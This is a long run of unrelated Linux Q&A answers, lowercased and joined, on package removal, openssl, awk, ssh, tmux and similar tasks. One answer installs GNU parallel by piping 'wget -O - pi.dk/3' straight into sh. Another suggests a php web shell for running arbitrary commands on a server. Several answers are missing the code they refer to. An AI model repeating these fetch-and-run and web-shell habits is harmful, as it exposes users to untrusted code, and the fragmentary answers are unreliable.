debian uses tasksel for installing software for a specific system . the command gives you some information : the command above lists all tasks known to tasksel . the line desktop should print an i in front . if that is the case you can have a look at all packages which this task usually installs : &gt; tasksel --task-packages desktop twm eject openoffice.org xserver-xorg-video-all cups-client \u2026  on my system the command outputs 36 packages . you can uninstall them with the following command : &gt; apt-get purge $(tasksel --task-packages desktop)  this takes the list of packages ( output of tasksel ) and feeds it into the purge command of apt-get . now apt-get tells you what it wants to deinstall . if you confirm it everything will be purged from your system .
lvs | fgrep "mwi"  " m " means : mirrored
as the message describes you can not put /boot in an encryption container . for unlocking the encryption container you need to access some utilities . if these utilities are inside the encryption container you are in a deadlock situation . as a work-around use a unencrypted small 3rd raid container holding only the /boot file system . from the security perspective this is not a big loss . the /boot should only contain technical data . there is a small caveat : if you use a password for grub , it should be different from the pass-phrase for the encryption container .
try mplayer , it is usually the audio and video player that supports the widest range of formats . if you have a supposedly rtsp source which is actually an http url , first retrieve the contents of the url ; you will get a file containing just another url , this time rtsp:// ( sometimes you get another http url that you need to follow too ) . pass the rtsp:// url to mplayer on its command line . there are servers out there ( and , for all i know , hardware devices too ) that serve files containing a rtsp:// url over http , but then serve content in the mms protocol¹ . this is for compatibility with some older microsoft players ( my memory is hazy over the details ) , but it breaks clients that believe that rtsp is rtsp and mms is mms . if you obtain an rtsp:// url that does not work at all , try replacing the scheme with mms:// . ¹ no relation with multimedia messaging service a.k.a. video sms .
not stock , but here are a few tool i have used before : primes ( usually in your distributions games package ) just simply fork off a few dozen and it will generate primes from now until forever . stress : http://people.seas.harvard.edu/~apw/stress/ cpuburn : http://patrickmylund.com/projects/cpuburn/
the " seconds since 1970" timestamp is specifically defined as utc in most usages . in particular , you may notice that date +%s gives the same result as date -u +%s . the relevant line where this is set in the shadow password utilities is " nsp-&gt;sp_lstchg = (long) time ((time_t *) 0) / SCALE;  which would make it utc . scale is defined as 86400 ( except via a specific ifdef that i can not quite trace what circumstances cause to be defined )
@stephanechazelas is right in the comment . possibly you have a name service cache daemon . try after sudo nscd -i hosts ( to invalidate the host cache ) . i can not make a comment the answer of a question so i answer this question myself .
backtrack linux is not configured by default to load a display manager , so there is more work to be done than just installing gdm . here 's a step-by-step of one way to install and enable gdm in backtrack 5 r1 . first , thanks to @davidvermette for the youtube link . this video covers all the steps , albeit in a different order and with little to no explanation : http://www.youtube.com/watch?v=9umqsvfvo58 note : some of the commands or procedures below may require elevation , though i am not sure which . in a default install of backtrack 5 , you are running as root anyway so this should not be an issue unless you have set yourself up to run as a limited user . in that case , ( and since you are running backtrack in the first place ) i trust you know how to troubleshoot " i need to do this as root " issues yourself . firstly , of course , you need to install gdm . this can be done with the following command : apt-get install gdm  next , you need to configure the system to load gdm at startup . this can be done by editing /etc/rc.local to include the following line : /usr/sbin/gdm &amp;  remember to leave exit 0 as the last line in /etc/rc.local and save it . last , you will probably want ( as i did , in the question posted here ) to load the x windows interface automatically after login . this can be done by adding the following lines to .bash_profile in the home directories of any users for which you want it applied . startx  in the case of a default backtrack install where the only user is root , the only file you need to worry about is /root/.bash_profile . optionally , the video linked above also walks you through setting up an extra user account . this is not necessary for gdm to work , or for the system to auto-start the desktop - i imagine it is included merely for aesthetics or some personal preference . after all of the above , reboot your system and you should see the settings have been applied . gdm will load to prompt you for your credentials and give you some other options to pick for your desktop environment . after successful authentication , your chosen desktop environment should load .
in my experience , the simplest way to transfer environment settings is to copy the user configuration directories wholesale , renaming the existing directories first . in the case of xfce , that would be ~/.config/xfce4 . there may also be necessary files in ~/.local . be sure to install any requisite software before copying the configuration .
i am not clear on just what your " dummy cursor " would do other than alter the color of the text at its position . if that is all you want , you could do that with overlays or text properties . if i am understanding you properly , you had probably want to use an overlay , because your " cursor " should not be copied along with the text it is currently sitting on ( e . g . if you kill and yank text ) .
you need the kernel image , initrd , and also ( usually ) kernel parameters so it will mount the arch root rather than your fedora root . if your arch has an autogenerated grub . conf in its /boot/ you can probably just use ( copy and paste ) the menuentry from there , or make your fedora grub load the arch grub config . that way you would not have to edit/update your fedora grub conf everytime arch installs a new kernel . something like this could work ( but i have not actually tested it ) : menuentry "Switch to Arch Grub" { set root=(hd0,7) # your arch partition configfile /boot/grub/grub.cfg # your arch grub.cfg } 
you can use openssl for that ( and for other hash algorithms ) :
assuming your certificates are in pem format , you can do : openssl verify cert.pem  if your " ca-bundle " is a file containing additional intermediate certificates in pem format : openssl verify -untrusted ca-bundle cert.pem  if your openssl is not set up to automatically use an installed set of root certificates ( e . g . in /etc/ssl/certs ) , then you can use -CApath or -CAfile to specify the ca .
do the build , then list the .o files . i think every .c or .S file that takes part in the build is compiled into a .o file with a corresponding name . this will not tell you if a security issue required a fix in a header file that is included in the build . a more precise method is to put the sources on a filesystem where access times are stored , and do the build . files whose access time is not updated by the build were not used in this build . touch start.stamp make vmlinux modules find -type f -anewer start.stamp 
i remember having used php shell to issue commands through a browser . you would not be able to manage remotly the power . php shell is a shell wrapped in a php script . it is a tool you can use to execute arbitrary shell-commands or browse the filesystem on your remote webserver . this replaces , to a degree , a normal telnet connection , and to a lesser degree an ssh connection . better use https with that tool .
to exactly match the final sequence in square brackets : perl -alne 'm/S?SELECT.*?(?=\[ \S+ @ \S+ \]$)/ &amp;&amp; print $&amp;;' file  outputs
the main difference between runnning /etc/init.d/foo start and service foo start , is that service runs the init script in a clean environment . if you have a case where running the init script directly works , but does not with service , the an environment variable is being used in the startup that you have not manually initialized inside of the script . since your init script is really simple , the environment variable usage is likely in the /home/oracle/scripts/startup.sh script . also note that if it does not run with service , it will not properly start on boot .
you can have different private keys in different files and specify all of them in ~/.ssh/config using separate IdentityFile values ( or using -i option while running ssh ) . they would be tried in sequence ( checkout man 5 ssh_config ) . if you are using ssh-agent though , you might have to tell the agent about the multiple keys you have using ssh-add .
there are very few files that absolutely must be different between two machines , and need to be regenerated when cloning : the host name /etc/hostname . the ssh host keys : /etc/ssh_host_*_key* or /etc/ssh/ssh_host_*_key* or similar location . the random seed : /var/lib/urandom/random-seed or /var/lib/random-seed or similar location . anything else could be identical if you have a bunch of identical machines . a few files are typically different on machines with different hardware : /etc/fstab , /etc/crypttab , /etc/mdadm.conf , and bootloader configuration files ( if located in /etc — some distributions put them in /boot ) if disks are partitioned differently . /etc/X11/xorg.conf , if present , if the machines have different graphics cards . modules to load or blacklist in /etc/modules , /etc/modprobe.conf , /etc/modprobe.d/ and /etc/modutils/ . in addition , some network configuration may need to change , in particular : if you have static ip addresses , they need to be diversified per machine . the location of ip configuration varies between distribution ( e . g . /etc/network/interfaces on debian , /etc/sysconfig/network on red hat ) . /etc/hosts often contains the host name . mail configuration often contains the host name : check /etc/mailname . there is no general answer to “what are the files in /etc folder ( … ) are unique for each computer” because the whole purpose of /etc is to store files that can be customized on each computer . for example , if you have different accounts on different machines , then obviously you can not share the account database — and if you want to be able to share the account database , then you will end up with the same accounts . generally speaking , do not try to share /etc by default unless you have a set of machines with the same software configuration — same installed software , same accounts , etc . if you do share /etc , you will need to blacklist a few files from sharing as indicated above . if you have machines with different configurations , then whitelist what you synchronize . treat files in /etc as distinct on different machines , like files in /var . synchronize only the ones that you have decided should apply everywhere . one possible way to manage synchronization is to keep machine-specific files in a different directory , e.g. /local/etc , and make symbolic links like /etc/fstab -&gt; ../local/etc/fstab . this still requires a largely homogeneous set of machines in terms of software as different distributions put files in different locations . or , conversely , keep only the machine-specific files in /etc and all generic files elsewhere — but typical distributions do not accommodate this well . you obviously can not do a live test of the restoration of the system configuration of one system on a different system . to test the restoration of your backups , fire up a virtual machine that emulates the hardware configuration sufficiently well ( in particular , with a similar disk layout ) .
from the gnu find manual : if your find' command removes directories, you may find that you get a spurious error message whenfind ' tries to recurse into a directory that has now been removed . using the `-depth ' option will normally resolve this problem . other questions : the simplicity of the command depends on your situation , which in the listed case would be : rm -rf practice* . iirc , the processing order of the files depends on the file system .
according to this thread , it is the behavior posix specifies for using " set -e" in a subshell . ( i was surprised as well . ) first , the behavior : the -e setting shall be ignored when executing the compound list following the while , until , if , or elif reserved word , a pipeline beginning with the ! reserved word , or any command of an and-or list other than the last . the second post notes , in summary , should not set -e in ( subshell code ) operate independently of the surrounding context ? no . the posix description is clear that surrounding context affects whether set -e is ignored in a subshell . there is a little more in the fourth post , also by eric blake , point 3 is not requiring subshells to override the contexts where set -e is ignored . that is , once you are in a context where -e is ignored , there is nothing you can do to get -e obeyed again , not even a subshell . $ bash -c 'set -e; if (set -e; false; echo hi); then :; fi; echo $?' hi 0  even though we called set -e twice ( both in the parent and in the subshell ) , the fact that the subshell exists in a context where -e is ignored ( the condition of an if statement ) , there is nothing we can do in the subshell to re-enable -e . this behavior is definitely surprising . it is counter-intuitive : one would expect the re-enabling of set -e to have an effect , and that the surrounding context would not take precedent ; further , the wording of the posix standard does not make this particularly clear . if you read it in the context where the command is failing , the rule does not apply : it only applies in the surrounding context , however , it applies to it completely .
one word : journaling . http://www.thegeekstuff.com/2011/05/ext2-ext3-ext4/ as you talk about embedded im assuming you have some form of flash memory ? performance is very spiky on the journaled ext4 on flash . ext2 is recommended . here is a good article on disabling journaling and tweaking the fs for no journaling if you must use ext4: http://fenidik.blogspot.com/2010/03/ext4-disable-journal.html
from htop source code , file uptimemeter . c , you can see : i think ! here is just a mark that server has been up for more than 100 days . reference http://sourceforge.net/p/htop/mailman/htop-general/?viewmonth=200707 http://blog.alexcollins.org/2009/01/14/why-does-htop-display-an-exclamation-mark-next-to-uptime/
#!/bin/sh for f in comp1/* ; do diff "comp1/$f" "comp2/$f" &gt; "$f.diff" done  this script assumes you have files of the same name in both directories .
the recommended way of having multiple python versions installed is to install each from source - they will happily coexist together . you can then use virtualenv with the appropriate interpreter to install the required dependencies ( using pip or easy_install ) . the trick to easier installation of multiple interpreters from source is to use : sudo make altinstall  instead of the more usual " sudo make install " . this will add the version number to the executable ( so you had have python-2.5 , python-2.6 , python-3.2 etc ) thus preventing any conflicts with the system version of python .
i figured out the correct bootloader of windows is hidden somewhere in the large packed files that come on the installation image . it can be unpacked , put into right boot directory and then loaded with grub2 chainloader as usually . i do not get why despite having right loader microsoft hides it somewhere deep and places the strange one into default boot dir . it worked for me ( though , i downloaded the file provided on the instructions page i found because it was quite some pain to unpack it ) . unfortunately , i do not remember details , i found manual somewhere on the web , but the general idea is described .
i finally managed to actually test the python script i mentioned as the second option in my question . it turns out that it does work when asking to shut down as well , not just on reboot .
oddly enough , under /etc/libvirt . virt-manager does not run as root , but it communicates with libvirtd that does .
the command could have been : namei -m /home/user/dir/child/file 
most likely it is using the rhnplugin to access " rhn classic . " to disable a repository ( unsubscribe from a channel ) you use the rhn-channel command or the web interface at http://rhn.redhat.com/
by default , apt-listchanges only displays the package news file , not the changelog . the news file is supposed to include only important information about things like backwards-incompatibility . for example , the news may notify you of configuration files that you need to edit , or that upstream decided to switch to a new configuration format , etc . it sounds like your apt-listchanges got changed from the default settings . to changed , either run dpkg-reconfigure apt-listchanges as root or edit /etc/apt/listchanges.conf . if you want unattended upgrades , i suggest you select select the " mail " method of displaying changes , and " news " only . make sure to disable the prompt for confirmation after displaying . this way , the important information will be emailed to you , but it will not interrupt your upgrade . you may also want to change your debconf priority to critical ( dpkg-reconfigure debconf ) if it is not already .
the state in the last paragraph is sufficient - add /media , add the group vboxsf and reboot ( which i did not when i tried this before ) .
apt-get and aptitude have different dependency resolvers . you can get aptitude to offer suggestions for fixing the broken packages with aptitude install -f . judging by your updated question , it look like you have mixed releases or distros in your sources.list .
here is a working solution : the only differences with my initial non working solution are the backslashes around the quotes in the second argument of scp .
there are two things wrong : you cannot use spaces around the assignment operator . as your script currently is , bash interprets the line to mean " run name with the arguments = and Elvin John Paul" . the line should look like the following : name="Elvin John Paul"  you have windows-style line endings ( crlf instead of just lf ) , which results in the error about $'\r' . in recent cygwin versions , you can use set -o igncr to ignore carriage returns as part of a cr lf , or you can fix this with sed like so : sed 's/\r$//' file &gt; file2 
yes , you should package up your changes as a dkms module . building modules for several installed kernels or automatically rebuilding them on an updated kernel is the main feature of dkms . ubuntu community documention has a nice article on this topic here .
you did not specify the shell you are using , but e.g. man bash /CONDITIONAL EXPRESSIONS 
in awk , there are two main separators : the field separator , and the record separator . the record separator separates different groups of fields . as you can probably guess from this description , the default record is a newline . you can access the current record index in the variable NR . awk 'NR==2 { print; exit }'  you can also just write awk NR==2 , but awk will ( since you did not tell it to exit after finding it ) loyally continue processing the rest of the file after it reaches line 2 , which might take a long time in a large file . the exit tells awk to exit immediately after printing record 2 .
i believe it is not . this bit is only used on executable files . it is defined in linux kernel headers as S_ISUID . if you grep kernel sources for this constant , you will find that it is only used in : should_remove_suid function , which is used on fs operations that should remove suid/sgid bit , prepare_binprm function in fs/exec.c which is used when prepairing executable file to set euid on exec , pid_revalidate function in fs/proc/base.c which is used to populate procfs , notify_change function in fs/attr.c which is used when changing file attributes , is_sxid function in include/linux/fs.h which is only used by XFS and GFS specific code and notify_change function , in filesystem specific code ( of course ) so it seems to me that this bit is only used ( from userspace perspective ) when executing files . at least on linux .
sounds like you want : awk -F, ' BEGIN { for (i = 1; i &lt; ARGC; i++) group[ARGV[i]] ARGC=0 } NR &gt;= 2 &amp;&amp; $2 in group' "$@" &lt; infile  or if you really want to consider the arguments as regexps to match against the second column :
i found this blog with a title posted : ntfsundelete - undeleting ntfs files , and the following example : $ sudo ntfsundelete /dev/sda2 -u -m '*.mp3' -p 100 -t 5m \ -d /media/externalExt3/undeleted  are you using sudo when you run your command ?
put this script in a file ( ex : ' increase . awk' ) : and then call : gawk -f increase.awk &lt; yourinputfile  explanation : in awk , split("string", a, "separatorstring") splits the " string " into an array called a , using " separatorstring " as separator . so a [ 1 ] contains everything until the 1st " separatorstring " , then a [ 2 ] contains everything until end of line or until the next " separatorstring " , etc .
well , i moved away from case statements toward egrep as that seemed to help me . i had issues with passing parameters into my function . . . so i just quit doing that . not the best but i got it to work . any further thoughts on it ?
you should stop the process that the crontab started running . #kill -HUP PID (PID: Process ID is the process running)  to see a relation of the pid with the running processes ( and more info ) use top command , change the column order with the keys &lt; and &gt; also try ps -ax|grep [your_process_file] which lists the running processes filtered by the name you choose -hup = hang up
i replaced the label LOGITECH_FF with LOGIWHEELS_FF in the file /usr/src/linux-2.6.34-12/drivers/hid/Kconfig . set default y as shown below : the fftest worked with constant force as shown below . thanks to : simon from linux-input mailing list . http://www.spinics.net/lists/linux-input/msg19084.html
this feature is called software flow control ( xon/xoff flow control ) when one end of the data link ( in this case the terminal emulator ) can not receive any more data ( because the buffer is full or nearing full or the user sends C-s ) it will send an " xoff " to tell the sending end of the data link to pause until the " xon " signal is received . what is happening under the hood is the " xoff " is telling the tty driver in the kernel to put the process that is sending data into a sleep state ( like pausing a movie ) until the tty driver is sent an " xon " to tell the kernel to resume the process as if it were never stopped in the first place . C-s enables terminal scroll lock . which prevents your terminal from scrolling ( by sending an " xoff " signal to pause the output of the software ) . C-q disables the scroll lock . resuming terminal scrolling ( by sending an " xon " signal to resume the output of the software ) . this feature is legacy ( back from the 80 's when terminals were very slow and did not allow scrolling ) and is enabled by default . to disable this feature you need the following in either ~/.bash_profile or ~/.bashrc: stty -ixon 
assuming you are talking c/c++ , use setsockopt() and SO_REUSEADDR . this allows reuse as long as there is no active process listening to that port . edit : the reason it is still in use is you did not close the socket down appropriately . you control-c killed it . you can use netstat to see the ports that are open or not quite closed yet . http://www.beej.us/guide/bgnet/output/html/multipage/setsockoptman.html stackexchange-url stackexchange-url
it is more a job for perl like : perl -MTime::Piece -pi -e 's/\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d/ (Time::Piece-&gt;strptime($&amp;,"%Y-%m-%dT%T")+2*3600)-&gt;datetime/ge' file1 file2... 
not exactly what you ask , because you do not have a new real window or tab . you can start screen on the server ( if available ) , so that you can multiplex your server sessions . after that you have still a single screen window , but if you do ctrl + a c , you create a new screen window , and switch between the windows with ctrl + a 0 , ctrl + a 1 . you have the added advantage that you can disconnect from the server leaving the two ( or more ) sessions alive ( ctrl + a d ) , then restore them later ( screen -dr ) .
a problem with split --filter is that the output can be mixed up , so you get half a line from process 1 followed by half a line from process 2 . gnu parallel guarantees there will be no mixup . so assume you want to do :  A | B | C  but that b is terribly slow , and thus you want to parallelize that . then you can do : A | parallel --pipe B | C  gnu parallel by default splits on \n and a block size of 1 mb . this can be adjusted with --recend and --block . you can find more about gnu parallel at : http://www.gnu.org/s/parallel/ you can install gnu parallel in just 10 seconds with : wget -O - pi.dk/3 | sh  watch the intro video on http://www.youtube.com/playlist?list=pl284c9ff2488bc6d1
the netstat output shows that node is only listening on localhost , so you need to either use a browser on that virtual console and navigate to localhost:37760 or update the config of the whatever node is to listen on all addresses .
call rsync and exclude the directory where you are putting the copy . cd mkdir copy rsync -a --exclude=copy . copy  copying * excludes dot files ( files whose name begins with a . ) , which are common and important in a home directory .
you just need to add it to your .vimrc file . set tabstop=2 
update : added a script ( not a one liner , though ) which allows you to choose which columns you want justified . . . it caters for left ( default ) and right ( not center ) . . as-is , it expects tab delimited fields . you can change the column output seperator via $s . typical output : | The Lost Art | +1255 | 789 | Los | -55 | | of the Idle Moment | -159900 | 0123 | Fabulosos Cadillacs | +321987 |  note:column does not work as you might expect when you have empty cells . from here on is the original answer which is related to but does not specifically address tne main issue of th question . . here is the " one-liner " which suits integers ( and allows +/- signs ) . . the " x " place-holder forces column to right-pad the last cell . sed 's/$/\tX/g' file |column -t |sed -r 's/([-+]?[0-9.]+)( +)/\2\1/g; s/^ //; s/X$//'  typical output  +1255 789 011 -55 34 -159900 33 022 +321987 2323566  if you have float values , or floats mixed with integers , or just integers , ( optional leading +/- signs ) , a bit more shuffling works . typical output +1255 789 0.11 -55 34 -15.9900 33 0.22 +321.987 2323566 
if i got you right , you need to get all ranges at once . you can do it with following sed construction : sed -n '/\\begin{FOO}/,/\\end{FOO}/p; /\\begin{FOO1}/,/\\end{FOO1}/p; /\\begin{FOO2}/,/\\end{FOO2}/p;' ./*.tex &gt;&gt; newfile.txt  where foo == thm , foo1 == lem , foo2 == prop .
yes . by putting network interfaces into promiscuous mode , tcpdump is able to see exactly what is going out ( and in ) the network interface . tcpdump operates at layer2 + . it can be used to look at ethernet , fddi , ppp and slip , token ring , and any other protocol supported by libpcap , which does all of tcpdump 's heavy lifting . have a look at the pcap_datalink ( ) section of the pcap man page for a complete list of the layer 2 protocols that tcpdump ( via libpcap ) can analyze . a read of the tcpdump man page will give you a good understanding of how exactly , tcpdump and libpcap interface with the kernel and network interfaces to be able to read the raw data link layer frames .
according to http://www.vim.org/download.php, sun solaris vim is included in the companion software : http://wwws.sun.com/software/solaris/freeware/. vi has had the :ve[rsion] command going back at least as far as 1979 , so it should work on any solaris release .
i do not think there is a terminfo capability for that . in practice , testing the value of TERM should be good enough . that is what i do in my .bashrc and .zshrc , and i do not recall it being a problem . case $TERM in (|color(|?))(([Ekx]|dt|(ai|n)x)term|rxvt|screen*)*) PS1=$'\e\]0;$GENERATED_WINDOW_TITLE\a'"$PS1" esac 
you need an -r or --no-run-if-empty options . keep in mind that this particular behavior is hard to make cross-platform . bsd versions of xargs run with -r by default . gnu version needs it . freebsd version of xargs ignores -r flag for compatibility with gnu . mac os x version does not even accept the flag and throws an error illegal option . you might then choose to use an os detection based on $OSTYPE to write a cross-platform script . even better , try to detect the behavior of xargs itself . run it with -r and if that fails ( status code > 0 ) , run it without -r .
here 's some sample log file output : which user is which ? if you take notice of the output above there is a number between square brackets , internal-sftp[32524] . the number is 32524 . this represents the session id for user joeuser , so you can use this string together which messages relate to which user 's login . rotating the logs you can modify the log rotation schedule for various logs under /etc/logrotate.d/* . each log file typically has a corresponding file in this directory . so you could change the syslog file there , for example or create your own for your sftp.log logfile . also logrotate has a configuration file , /etc/logrotate.conf which contains these lines : # rotate log files weekly weekly # keep 4 weeks worth of backlogs rotate 4  these are what the files in the /etc/logrotate.d directory use , if they do not have a setting of their own . so most files are rotated weekly and 4 of them are kept . if you wanted to keep 6 months it would be 4*6 = 24 for the rotate option to keep 6 months , roughly . example given you are logging to /var/log/sftp.log via syslog you will need to make your changes in this file , /etc/logrotate.d/syslog . your file will look like this after making the required changes : since you are using syslog you will have to rotate all these log files as well , keep 24 weeks worth of these as well . if this is unacceptable then your only other course of action would be to create a separate section in this file , syslog like so : this has some side-effects , one being that you will be restarting the syslog daemon 2 times each week instead of once . but the logroate syntax does not allow for fine granular control of the rotation schedule for certain logfiles while not rotating others , when the log files are being generated by the same service , i.e. syslog . references sftp file transfer session activity logging
i do not know if this qualifies as an answer , but i managed to solve the problem by downgrading from voyage 0.8.0 to voyage 0.7.5 which installed fine after following the above steps .
the jiffy does not depend on the cpu speed directly . it is a time period that is used to count different time intervals in the kernel . the length of the jiffy is selected at kernel compile time . more about this : man 7 time one of fundamental uses of jiffies is a process scheduling . one jiffy is a period of time the scheduler will allow a process to run without an attempt to reschedule and swap the process out to let another process to run . for slow processors it is fine to have 100 jiffies per second . but kernels for modern processors usually configured for much more jiffies per second .
i was not able to confirm this is truly a bug or not but this ubuntu bug would seem to lead credence to this assumption , titled : " wodim does not find my dvd writer " . this thread listed a workaround by including the dev= to wodim . this works so long as you know your cd/dvd devices handle . --scanbus --devices an alternative ? as an alternative you can also list the devices in wodim without having to know the device ahead of time by using the -prcap switch . this 3rd method would seem to be the best option .
boot . img are images for fastboot that contain the kernel . it is android specific . you can unpack these , but there is no build for a reference board that qemu supports . you can run unity-next on the desktop . this is build in qt and qml so as long as all dependies are build on the desktop , it can run . here 's a how-to : http://unity.ubuntu.com/getinvolved/development/unitynext/
thunderbird 's particular directory is not in your path , and it does not need to be there . you have a symbolic link in /usr/bin of name thunderbird pointing to the real executable/script launching thunderbird . on my machine it is the following : $ ls -l /usr/bin/thunderbird lrwxrwxrwx 1 root root 40 2012-03-29 09:08 /usr/bin/thunderbird -&gt; ../lib/thunderbird-11.0.1/thunderbird.sh  i think you can change this with $ sudo ln -sf /usr/lib/thunderbird-11/thunderbird.sh /usr/bin/thunderbird  or something similar .
an inode is a structure in some file systems that holds a file or directory 's metadata ( all the information about the file , except its name and data ) . it holds information about permissions , ownership , creation and modification times , etc . systems the offer a virtualised file system access layer ( freebsd , solaris , linux ) , can support different underlying file systems which may or may not utilise inodes . reiserfs , for example , does not use them , whereas freebsd 's ffs2 does . the abstraction layer through which you access the file system provides a single and well-defined interface for file operations , so that applications do not need to know about the differences between different file system implementations .
you should use the --no-collapse option , instead of --tab-correct , and insert literal tabs in your string , for example with "star "$'\t'" end"  or using ctrl - v and pressing the tab key .
my server has the same ethernet controller as yours , intel corporation device 1521 . according to lsmod , the module is igb .
use the esmtps id from mx . google . com to identify duplicates . these should be unmodified . in the example above : by mx . google . com with esmtps id e20sm18902485fga . 1.2008.01.04.07.58.46 a very simple implementation would put all mails in one dir , extract the id and symlink the file to the id without using -f . like :
file system capabilities in linux were added to allow more fine-grained control than setuid alone will allow . with setuid it is a full escalation of effective privileges to the user ( typically root ) . the capabilities ( 7 ) manpage provides the following description : for the purpose of performing permission checks , traditional unix implementations distinguish two categories of pro‐ cesses : privileged processes ( whose effective user id is 0 , referred to as superuser or root ) , and unprivileged pro‐ cesses ( whose effective uid is nonzero ) . privileged processes bypass all kernel permission checks , while unprivi‐ leged processes are subject to full permission checking based on the process 's credentials ( usually : effective uid , effective gid , and supplementary group list ) . starting with kernel 2.2 , linux divides the privileges traditionally associated with superuser into distinct units , known as capabilities , which can be independently enabled and disabled . capabilities are a per-thread attribute . if an application needs the ability to call chroot ( ) , which is typically only allowed for root , CAP_SYS_CHROOT can be set on the binary rather than setuid . this can be done using the setcap command : setcap CAP_SYS_CHROOT /bin/mybin  as of rpm version 4.7.0 , capabilities can be set on packaged files using %caps . fedora 15 had a release goal of removing all setuid binaries tracked in this bug report . according to the bug report , this goal was accomplished . the wikipedia article on capability-based security is good read for anyone interested .
as far as i know , there is no way of making bash autocomplete *pictu , but here are some workarounds : do not use tab , just cd directly using wildcards before and after the pattern : $ cd *pictu*  that will move you into the first directory whose name contains pictu . use two wildcards and then tab : $ cd *pictu*&lt;TAB&gt;  that should expand to cd 1122337\ pictures\ of\ kittens/ use another shell . zsh has a cool feature , you can do : \u279c cd pictu&lt;tab&gt;  and that expands to \u279c cd 1122337\ pictures\ of\ kittens/ .
in zsh , y=${x:A:t}  would expand to the tail of the absolute path of $x . so it would be some_file.txt unless some_file.txt is itself a symlink to something else . otherwise , you can use zsh zstat builtin : zmodload zsh/zstat zstat -A y +link -- $x &amp;&amp; y=$y:t 
the good news is that cinnamon 's applets are simple javascript files stored under /usr/share/cinnamon/applets/ . the volume applet script is /usr/share/cinnamon/applets/sound@cinnamon.org/applet.js . in that file , there is a sub routine whose job it is to annoy me by making my computer beep at me : commenting those lines out to make the function do nothing gets rid of the beep : that is it , just save the file ( you will need to open it as root ) , restart cinnamon or just remove and then add the applet and the sound is gone .
raid 0 has no redundancy so the array actually becomes more fragile with more disks since a failure in any of them will render the entire array unrecoverable . if you want to continue with your raid 0 ( for performance reasons presumably ) , and minimize downtime , boot your system with a rescue os , e.g. , systemrescuecd , and use ' dd ' or ' ddrescue ' to make the best copy of /dev/sdf1 that you can . replace the old /dev/sdf1 with the new /dev/sdf1 and continue to worry about the next drive failure .
find prints the errors to stderr . if you just want to ignore them , the simplest thing to do is : find ... 2&gt; /dev/null  find also has the -perm option to filter based on permissions .
the solution is to get the shell to substitute the color variables when defining the prompt , but not the functions . to do this , use the double quotes as you had originally tried , but escape the commands so they are not evaluated until the prompt is drawn . PS1="\u@\h:\w${YELLOW}\$(virtual_env)${GREEN}\$(git_branch)${RESET}$ "  notice the \ before the $() on each command . if we echo this out , we see : echo "$PS1" \u@\h:\w\[\033[33m\]$(virtual_env)\[\033[32m\]$(git_branch)\[\033[0m\]$  as you can see , the color variables got substituted , but not the commands .
rebuild needs two dashes , not one . --rebuild .
i have figured out what is going on . the messages are coming to the server from remote hosts via udp . i did not notice the host field changing at first , my mistake . btw , actually there is a possibility to login using public key authentication with no authorized_keys file involved . redhat ( and variants ) have a supported patch for openssh that adds the AuthorizedKeysCommand and AuthorizedKeysCommandRunAs options . the patch has been merged upstream in openssh 6.2 . to quote from the man page : authorizedkeyscommand specifies a program to be used for lookup of the user 's public keys . the program will be invoked with its first argument the name of the user being authorized , and should produce on standard output authorizedkeys lines ( see authorized_keys in sshd ( 8 ) ) . by default ( or when set to the empty string ) there is no authorizedkeyscommand run . if the authorizedkeyscommand does not successfully authorize the user , authorization falls through to the authorizedkeysfile . note that this option has an effect only with pubkeyauthentication turned on . authorizedkeyscommandrunas specifies the user under whose account the authorizedkeyscommand is run . empty string ( the default value ) means the user being authorized is used .
because that is not how the at command works . at takes the command in via stdin . what you are doing above is running the script and giving its output ( if there is any ) to at . this is the functional equivalent of what you are doing : echo hey | at now + 1 minute  since echo hey prints out just the word " hey " the word " hey " is all i am giving at to execute one minute in the future . you probably want to echo the full php command to at instead of running it yourself . in my example : echo "echo hey" | at now + 1 minute  edit : as @gnouc pointed out , you also had a typo in your at spec . you have to say " now " so it knows what time you are adding 1 minute to .
you do not say what version of unix you are using , but on linux the passwd ( 1 ) man page shows :  --stdin This option is used to indicate that passwd should read the new password from standard input, which can be a pipe.  so all you have to do is run : echo 'somepassword' | passwd --stdin  edit to add : more portable is chpasswd which exists on ( at least ) both red hat and ubuntu : echo 'someuser:somepassword' | chpasswd  see the man page .
to open file using path relative to username 's home directory run , vim scp://username@remotehost/file which is same as, vim scp://username@remotehost//home/username/file  if you want to enter the absolute path to a file starting from / instead of your home directory , use two slashes after the host name run , vim scp://username@remotehost//absolute/path/to/file  editing your file is done exactly the same as for local files , including using :w to save your changes . behind the scene vim uses netrw plugin to read files , write files , browse over a network using various protocols like scp , rsync , ftp etc . :help netrw inside vim can give you a lot more information .
use less --follow-name if your version of less supports it . that option was introduced in version 416 .
tip : run set -x to enable tracing mode . bash prints each command before executing it . run set +x to turn off tracing mode . + find . '\(' '\)' -exec grep -IH needle '{}' '\;'  notice how the last argument to find is \; instead of ; . you have the same problem with the opening and closing parentheses . in your source , you have quoted the semicolon twice . change  find_cmd=(find "$@" '\(') \u2026 find_cmd+=('\)' -exec grep -IH "$pattern" {} '\;')  to  find_cmd=(find "$@" '(') \u2026 find_cmd+=(')' -exec grep -IH "$pattern" {} ';')  or  find_cmd=(find "$@" \() \u2026 find_cmd+=(\) -exec grep -IH "$pattern" {} \;)  additionally , -name \'*.$file_type\' has bad quotes — you are looking for files whose name starts and ends with a single quote . make this -name "*.$file_type" ( the * needs to be quoted in case there are matching files in the current directory , and variable expansions should be in double quotes unless you know why you need to leave out the double quotes ) .
i found two possible solutions . i am not sure which one is " best " . adding wd_disable=1 to the module commandline seems to work , as does 11n_disable=1 , as suggested by @slm 's answer linked in comments above . in short , edit /etc/modprobe.d/iwlwifi.conf and add either : options iwlwifi 11n_disable=1  or optoins iwlwifi wd_disable=1  fwiw , i am using the former at the moment , as i know i do not want to use wireless-n , and disabling a queue watchdog does not seem like a good idea .
my trash works on xfce and here 's what my directory structure looks like in ~/.local/share which is the only place i have located a trash folder : based on this . . . mkdir ~/.local/share/Trash mkdir ~/.local/share/Trash/files mkdir ~/.local/share/Trash/info  and chmod -R 700 ~/.local/share/Trash  looks right to me .
you could put this on your ~/.tmux.conf set -g status-right-length 80 set -g status-right '#(exec tmux ls| cut -d " " -f 1-3 |tr "\\\n" "," )'  this will list all sessions , and " wrap " some of the information to make it fill in one line ; ) now , on your right site of the tmux bar , it will show the tmux sessions and the number of opened windows . the separation will be represented by ; edit : add the folowing line on your ~/.tmux.conf , so you can reload the configuration on the fly : bind r source-file ~/.tmux.conf  now , just hit &lt;Control + B , r &gt; and your are good to go .
